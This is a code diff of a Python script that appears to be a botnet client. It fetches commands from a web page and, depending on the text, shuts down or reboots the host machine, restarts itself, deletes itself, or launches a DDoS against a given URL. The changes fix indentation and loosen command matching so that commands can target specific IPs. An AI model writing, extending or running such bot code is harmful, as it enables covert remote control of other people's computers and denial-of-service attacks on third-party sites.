@@ -24,23 +24,23 @@ def mainTry():
 			command = soup.find_all('p')
 			textIW = command[0].text
 			if (textIW == "restartAll"):
-                        #If you compiled this code in EXE, remove the line below, and insert: os.system("start your_main_file(exe)_name.exe")
+                #If you compiled this code in EXE, remove the line below, and insert: os.system("start your_main_file(exe)_name.exe")
 				os.system("python main.py")
 				sys.exit()
 			if (textIW == "turnOffAll"):
 				os.system("shutdown -s")
 			if (textIW == "restartSYSAll"):
 				os.system("shutdown /r /t 1")
-			if (textIW == "turnOff"):
+			if ("turnOff" in textIW):
 				if (getNeedIP(textIW) == getTargetIP()):
 					os.system("shutdown -s")
-			if (textIW == "restartSYS"):
+			if ("restartSYS" in textIW):
 				if (getNeedIP(textIW) == getTargetIP()):
 					os.system("shutdown /r /t 1")
-			if (textIW == "restartApp"):
+			if ("restartApp" in textIW):
 				if (getNeedIP(textIW) == getTargetIP()):
 					#If you compiled this code in EXE, remove the line below, and insert: os.system("start your_main_file(exe)_name.exe")
-                              		os.system("python main.py")
+					os.system("python main.py")
 					sys.exit()
 			if ("ddos" in textIW):
 				urlForAttack = textIW.replace("ddos ", "")
@@ -57,7 +57,7 @@ def mainTry():
 			if ("deleteBot" in textIW):
 				if (getNeedIP(textIW) == getTargetIP()):
 					#If you compiled the code for self -loving in EXE, remove the line below, and insert: os.system("start your_file(exe)_name_for_deleting_client_file.exe")
-                              		import delete
+					import delete
 					sys.exit()
 		except requests.exceptions.ConnectionError:
 			pass
